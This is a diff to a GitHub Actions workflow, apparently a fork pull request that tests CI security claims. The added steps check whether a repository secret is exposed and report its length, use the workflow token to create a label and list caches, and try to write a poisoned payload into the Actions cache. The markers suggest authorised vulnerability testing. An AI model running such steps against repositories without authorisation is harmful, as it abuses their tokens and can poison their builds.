@@ -6,4 +6,21 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: marker
-        run: echo "F8-FORK-CODE-EXECUTED-BASE"
+        env:
+          S: ${{ secrets.F8_SECRET }}
+          GT: ${{ github.token }}
+        run: |
+          echo "F8-ADJUDICATOR-ROUND4-EXECUTED"
+          echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          if [ -n "$S" ]; then echo "SECRET_PRESENT len=${#S}"; else echo "SECRET_ABSENT"; fi
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-unset}"
+          curl -s -o /dev/null -w "labels_POST=%{http_code}\n" -X POST -H "Authorization: Bearer $GT" "https://api.github.com/repos/$GITHUB_REPOSITORY/labels" -d '{"name":"f8-adj-label"}'
+          curl -s -o /dev/null -w "caches_GET=%{http_code}\n" -H "Authorization: Bearer $GT" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/caches"
+      - name: build payload for cache-poison test
+        run: mkdir -p /tmp/f8 && echo POISONED-BY-FORK-PR > /tmp/f8/payload.txt
+      - name: attempt cache write (poisoning claim under test)
+        continue-on-error: true
+        uses: actions/cache/save@v4
+        with:
+          path: /tmp/f8
+          key: f8-poison-key-v1
